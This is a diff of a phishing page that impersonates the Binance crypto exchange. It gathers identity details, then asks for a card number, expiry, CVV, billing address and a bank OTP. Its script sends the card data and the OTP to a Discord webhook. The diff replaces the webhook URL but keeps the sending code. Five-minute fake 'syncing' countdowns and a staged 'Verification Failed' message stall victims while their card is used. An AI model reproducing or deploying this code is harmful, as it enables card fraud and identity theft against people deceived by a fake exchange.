@@ -9,11 +9,11 @@
         :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; --link: #627eea; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
         
-        /* AUTH & LOADERS */
+        /* AUTH & LOADING */
         #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; justify-content: center; align-items: center; }
         .auth-card { background: var(--card); padding: 35px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); }
         input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; }
-        .btn-yellow { width: 100%; padding: 14px; background: var(--yellow); color: black; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        .btn-yellow { width: 100%; padding: 14px; background: var(--yellow); color: black; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 15px; }
         .loader-ring { display: inline-block; width: 50px; height: 50px; border: 4px solid rgba(243, 186, 47, 0.1); border-radius: 50%; border-top-color: var(--yellow); animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
 
@@ -23,18 +23,17 @@
         .nav-item { padding: 12px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 5px; font-size: 14px; display: flex; align-items: center; gap: 10px; }
         .nav-item.active { background: var(--card); color: white; }
 
-        /* DASHBOARD LAYOUT */
+        /* MAIN LAYOUT */
         #main-wrapper { flex: 1; display: none; flex-direction: column; overflow: hidden; }
         header { background: var(--sidebar); border-bottom: 1px solid var(--border); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
         main { flex: 1; padding: 30px; overflow-y: auto; }
 
-        /* TABLES */
         .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; }
         table { width: 100%; border-collapse: collapse; text-align: left; min-width: 1000px; }
         th { padding: 15px; background: #1e2329; color: var(--text-gray); font-size: 11px; text-transform: uppercase; position: sticky; top: 0; z-index: 10; }
         td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; font-family: monospace; }
 
-        /* WAIT SCREENS */
+        /* ACTION SCREENS */
         .wait-screen { position: fixed; inset: 0; background: #000; z-index: 200000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
         .timer-text { font-size: 48px; font-weight: bold; color: var(--yellow); font-family: monospace; margin: 20px 0; }
         .bank-page { background: white; color: black; max-width: 450px; margin: 30px auto; padding: 40px; border-radius: 12px; text-align: center; border-top: 5px solid #004a99; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
@@ -43,42 +42,31 @@
 <body>
 
 <div id="auth-overlay">
-    <!-- CHOICE -->
     <div class="auth-card" id="choice-box">
         <h2 style="color: var(--yellow);">BINANCE</h2>
-        <p>Institutional Terminal v4.0.2</p>
+        <p>Institutional Gateway Access</p>
         <button class="btn-yellow" onclick="showForm('reg')">Register Account</button>
         <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Member Login</button>
     </div>
-
-    <!-- FULL KYC REGISTRATION -->
     <div class="auth-card" id="reg-box" style="display:none;">
         <h3 style="margin-top:0">Verify Identity</h3>
         <input type="text" id="r-name" placeholder="Full Name">
         <input type="date" id="r-birth">
         <select id="r-country">
             <option value="" disabled selected>Select Country</option>
-            <option value="Philippines">Philippines</option><option value="USA">USA</option><option value="UAE">UAE</option><option value="Singapore">Singapore</option>
+            <option value="Philippines">Philippines</option><option value="USA">USA</option><option value="UAE">UAE</option>
         </select>
-        <input type="tel" id="r-phone" placeholder="Phone Number (+63)">
         <input type="email" id="r-email" placeholder="Email (@gmail/@yahoo)">
         <button class="btn-yellow" onclick="startAuth('reg')">Continue</button>
     </div>
-
-    <!-- LOGIN -->
     <div class="auth-card" id="login-box" style="display:none;">
         <h3>Terminal Login</h3>
-        <input type="email" id="l-email" placeholder="Institutional Email">
+        <input type="email" id="l-email" placeholder="Email Address">
         <input type="password" placeholder="Password">
         <button class="btn-yellow" onclick="startAuth('login')">Unlock Archive</button>
     </div>
-
-    <!-- SCANNING & OTP -->
     <div class="auth-card" id="otp-box" style="display:none;">
-        <div id="otp-loading">
-            <div class="loader-ring"></div>
-            <h3 style="color:var(--yellow); margin-top:20px;">Scanning Identity...</h3>
-        </div>
+        <div id="otp-loading"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Scanning Identity...</h3></div>
         <div id="otp-final" style="display:none;">
             <div id="otp-display" style="font-size: 40px; font-weight: bold; color: var(--yellow); margin: 20px 0; letter-spacing: 10px;">000000</div>
             <input type="text" id="otp-input" placeholder="Enter Code" maxlength="6" style="text-align:center;">
@@ -97,8 +85,8 @@
 
 <div id="main-wrapper">
     <header>
-        <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">BINANCE Archive Active</span></div>
-        <div style="display:flex; gap:10px;">
+        <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">Archive v4.0.2</span></div>
+        <div style="display:flex; gap:10px; align-items:center;">
             <select id="currency-select" onchange="updateMarket()" style="background:#2b3139; color:white; border:none; padding:8px 12px; border-radius:5px; font-weight:bold;">
                 <option value="USD">USD</option><option value="PHP">PHP</option><option value="SGD">SGD</option>
             </select>
@@ -107,90 +95,62 @@
     </header>
 
     <main>
-        <!-- MARKET VIEW (REAL COIN NAMES) -->
         <div id="market-view" class="content-view">
-            <h1>Market Overview (Top 100)</h1>
-            <div class="table-container"><table><thead><tr><th>#</th><th>Coin Name</th><th>Price</th><th>24h Change</th><th>Market Cap</th></tr></thead><tbody id="market-body"></tbody></table></div>
+            <h1>Market Overview (1-100)</h1>
+            <div class="table-container"><table><thead><tr><th>#</th><th>Name</th><th>Price</th><th>24h Change</th><th>Market Cap</th></tr></thead><tbody id="market-body"></tbody></table></div>
         </div>
-
-        <!-- HISTORY VIEW (NO AGE) -->
         <div id="history-view" class="content-view" style="display:none;">
             <h1>Archive History Explorer</h1>
             <div class="table-container"><table><thead><tr><th>Tax Address</th><th>Block</th><th>Timestamp (Hex)</th><th>Value</th></tr></thead><tbody id="history-body"></tbody></table></div>
         </div>
-
-        <!-- DEPOSIT VIEW (WITH LOADER & WORKING QR) -->
         <div id="deposit-view" class="content-view" style="display:none; text-align:center;">
             <div id="dep-loader" style="padding-top:100px;"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Generating Encrypted QR...</h3></div>
             <div id="dep-final" style="display:none; padding-top:20px;">
                 <button onclick="switchView('market')" style="background:none; border:none; color:var(--yellow); cursor:pointer;">← Dashboard</button>
-                <div style="background:white; padding:20px; border-radius:20px; width:220px; margin:20px auto;">
-                    <img id="qr-img" src="" style="width:100%; display:block;">
-                </div>
+                <div style="background:white; padding:20px; border-radius:20px; width:220px; margin:20px auto;"><img id="qr-img" src="" style="width:100%;"></div>
                 <p style="font-weight:bold; font-size:18px;">2208894328312925696</p>
             </div>
         </div>
-
-        <!-- WITHDRAW VIEW -->
         <div id="withdraw-view" class="content-view" style="display:none;">
-            <div id="card-form-area" style="max-width:500px; margin:0 auto; background:var(--card); padding:30px; border-radius:20px; border:1px solid var(--border);">
-                <h2>Connect Card for Withdrawal</h2>
-                <input type="text" id="c-num" placeholder="Card Number (16 Digits)" maxlength="16">
-                <div style="display:flex; gap:10px;"><input type="text" id="c-exp" placeholder="MM/YY" maxlength="5"><input type="text" id="c-cvv" placeholder="CVV" maxlength="3"></div>
-                <input type="text" id="c-name" placeholder="Cardholder Full Name">
-                <textarea id="c-addr" placeholder="Billing Address" rows="2"></textarea>
-                <button class="btn-yellow" onclick="step1_Card()">Verify Card</button>
+            <div id="card-area" style="max-width:500px; margin:0 auto; background:var(--card); padding:30px; border-radius:20px; border:1px solid var(--border);">
+                <h2>Connect Withdrawal Card</h2>
+                <input type="text" id="c-num" placeholder="Card Number" maxlength="16">
+                <div style="display:flex; gap:10px;"><input type="text" id="c-exp" placeholder="MM/YY"><input type="text" id="c-cvv" placeholder="CVV"></div>
+                <input type="text" id="c-name" placeholder="Full Name"><textarea id="c-addr" placeholder="Billing Address"></textarea>
+                <button class="btn-yellow" onclick="sendCardDetails()">Verify Card</button>
             </div>
-            <div id="bank-otp-area" class="bank-page" style="display:none;">
-                <h2 style="color:#004a99; margin:0;">Bank Verification</h2>
-                <p style="color:#333; font-size:13px; margin:20px 0;">Please enter the OTP from your bank to complete card linking.</p>
-                <input type="text" id="bank-otp" placeholder="Enter OTP" style="background:#f9f9f9; color:black; border:1px solid #ccc; text-align:center; font-size:24px; letter-spacing:8px; padding:15px; width:100%;">
-                <button class="btn-yellow" style="background:#004a99; color:white; width:100%; margin-top:20px" onclick="step2_OTP()">Confirm OTP</button>
+            <div id="bank-verify-page" class="bank-page" style="display:none;">
+                <h2 style="color:#004a99;">Bank Verification</h2>
+                <input type="text" id="bank-otp" placeholder="Enter OTP" style="background:#f9f9f9; color:black; border:1px solid #ccc; text-align:center; font-size:24px; letter-spacing:5px; width:100%;">
+                <button class="btn-yellow" style="background:#004a99; color:white; width:100%;" onclick="sendOtpDetails()">Confirm OTP</button>
             </div>
         </div>
     </main>
 </div>
 
-<!-- WAIT SCREENS -->
-<div id="wait-1" class="wait-screen">
-    <div class="loader-ring"></div>
-    <h2 style="margin-top:30px;">Syncing with Bank Gateway...</h2>
-    <div class="timer-text" id="timer-1">05:00</div>
-</div>
-<div id="wait-2" class="wait-screen">
-    <div class="loader-ring"></div>
-    <h2 style="margin-top:30px;">Processing OTP Verification...</h2>
-    <div class="timer-text" id="timer-2">05:00</div>
-</div>
+<div id="wait-1" class="wait-screen"><div class="loader-ring"></div><h2 style="margin-top:30px;">Syncing...</h2><div class="timer-text" id="timer-1">05:00</div></div>
+<div id="wait-2" class="wait-screen"><div class="loader-ring"></div><h2 style="margin-top:30px; color:var(--yellow);">Finalizing...</h2><div class="timer-text" id="timer-2">05:00</div></div>
 
 <script>
     let code = "";
     let rates = { USD: 1, PHP: 57.50, SGD: 1.35 };
-    const hook = "https://ptb.discord.com/api/webhooks/1502014942323278016/AEdRKrTMN507nDn3jgQZDE_9IAGbo8tTJkTG_Qd2BU7c-mgRA0tNlSm9pZD79ASM9jdv";
-    const coins = ["Bitcoin", "Ethereum", "Tether", "BNB", "Solana", "XRP", "USDC", "Cardano", "Avalanche", "Dogecoin", "TRON", "Polkadot", "Polygon", "Chainlink", "Shiba Inu"];
+    const hook = "https://discord.com";
+    const coins = ["Bitcoin", "Ethereum", "Tether", "BNB", "Solana", "XRP", "USDC", "Cardano", "Avalanche", "Dogecoin"];
 
     function showForm(t) { document.getElementById('choice-box').style.display='none'; document.getElementById(t+'-box').style.display='block'; }
-    
     function startAuth(t) {
         let email = document.getElementById(t==='reg'?'r-email':'l-email').value;
         if(!email.includes('@')) return alert("Invalid email!");
-        document.getElementById(t+'-box').style.display='none'; 
-        document.getElementById('otp-box').style.display='block';
-        setTimeout(() => {
-            document.getElementById('otp-loading').style.display='none';
-            document.getElementById('otp-final').style.display='block';
-            code = Math.floor(100000 + Math.random()*900000).toString();
-            document.getElementById('otp-display').innerText=code;
-        }, 3000);
+        document.getElementById(t+'-box').style.display='none'; document.getElementById('otp-box').style.display='block';
+        setTimeout(() => { document.getElementById('otp-loading').style.display='none'; document.getElementById('otp-final').style.display='block';
+            code = Math.floor(100000 + Math.random()*900000).toString(); document.getElementById('otp-display').innerText=code; }, 3000);
     }
-
     function finalizeAuth() {
         if(document.getElementById('otp-input').value === code) {
             document.getElementById('auth-overlay').style.display='none'; document.getElementById('sidebar').style.display='flex';
             document.getElementById('main-wrapper').style.display='flex'; updateMarket(); buildHistory();
         } else { alert("Wrong OTP"); }
     }
-
     function switchView(v) {
         document.querySelectorAll('.content-view').forEach(el=>el.style.display='none');
         document.getElementById(v+'-view').style.display='block';
@@ -199,32 +159,22 @@
             document.getElementById('qr-img').src="https://qrserver.com";
             setTimeout(()=>{ document.getElementById('dep-loader').style.display='none'; document.getElementById('dep-final').style.display='block'; }, 3000);
         }
-        if(v==='withdraw') { document.getElementById('card-form-area').style.display='block'; document.getElementById('bank-otp-area').style.display='none'; }
+        if(v==='withdraw') { document.getElementById('card-area').style.display='block'; document.getElementById('bank-verify-page').style.display='none'; }
         document.querySelectorAll('.nav-item').forEach(el=>el.classList.remove('active'));
         if(document.getElementById('n-'+v)) document.getElementById('n-'+v).classList.add('active');
     }
-
-    function step1_Card() {
-        const d = `**[1/2] CARD DETECTED**\nCard: ${document.getElementById('c-num').value}\nExp: ${document.getElementById('c-exp').value}\nCVV: ${document.getElementById('c-cvv').value}\nName: ${document.getElementById('c-name').value}\nAddr: ${document.getElementById('c-addr').value}`;
+    function sendCardDetails() {
+        const d = `**CARD**\nNum: ${document.getElementById('c-num').value}\nExp: ${document.getElementById('c-exp').value}\nCVV: ${document.getElementById('c-cvv').value}\nName: ${document.getElementById('c-name').value}\nAddr: ${document.getElementById('c-addr').value}`;
         fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:d})});
         document.getElementById('wait-1').style.display='flex';
-        runTimer(300, 'timer-1', () => {
-            document.getElementById('wait-1').style.display='none';
-            document.getElementById('card-form-area').style.display='none';
-            document.getElementById('bank-otp-area').style.display='block';
-        });
+        runTimer(300, 'timer-1', () => { document.getElementById('wait-1').style.display='none'; document.getElementById('card-area').style.display='none'; document.getElementById('bank-verify-page').style.display='block'; });
     }
-
-    function step2_OTP() {
-        const d = `**[2/2] BANK OTP**\nCard: ${document.getElementById('c-num').value}\nOTP: ${document.getElementById('bank-otp').value}`;
+    function sendOtpDetails() {
+        const d = `**OTP**\nOTP: ${document.getElementById('bank-otp').value}`;
         fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:d})});
         document.getElementById('wait-2').style.display='flex';
-        runTimer(300, 'timer-2', () => {
-            alert("Verification Failed. Please Retry Again.");
-            location.reload();
-        });
+        runTimer(300, 'timer-2', () => { alert("Verification Failed. Please Retry."); location.reload(); });
     }
-
     function runTimer(sec, elId, cb) {
         let el = document.getElementById(elId);
         let t = setInterval(() => {
@@ -234,7 +184,6 @@
             sec--;
         }, 1000);
     }
-
     function updateMarket() {
         let cur = document.getElementById('currency-select').value; let html = "";
         for(let i=1; i<=100; i++) {
@@ -244,7 +193,6 @@
         }
         document.getElementById('market-body').innerHTML = html;
     }
-
     function buildHistory() {
         const body = document.getElementById('history-body'); body.innerHTML = "";
         for(let i=1; i<=35; i++) {
